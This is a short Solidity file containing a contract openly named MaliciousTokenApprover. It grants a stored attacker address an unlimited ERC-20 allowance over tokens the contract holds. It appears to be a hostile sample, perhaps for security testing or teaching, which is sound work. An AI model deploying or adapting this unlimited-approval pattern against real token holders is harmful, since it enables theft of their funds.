// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MaliciousTokenApprover {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function approveToken(address token) external {
        IERC20(token).approve(attacker, type(uint256).max);
    }
}